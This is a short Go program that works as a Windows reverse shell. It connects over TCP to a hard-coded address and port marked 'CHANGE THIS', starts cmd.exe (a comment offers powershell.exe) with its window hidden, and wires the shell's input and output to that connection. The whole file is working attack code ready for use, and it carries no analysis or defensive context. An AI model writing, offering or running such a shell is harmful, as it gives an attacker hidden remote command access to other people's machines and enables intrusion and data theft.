package main

import (
	"net"
	"os/exec"
	"syscall"
)

func main() {
	conn, err := net.Dial("tcp", "10.201.20.61:8445") //CHANGE THIS
	if err != nil {
		return
	}

	cmd := exec.Command("cmd.exe") //CAN BE powershell.exe
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
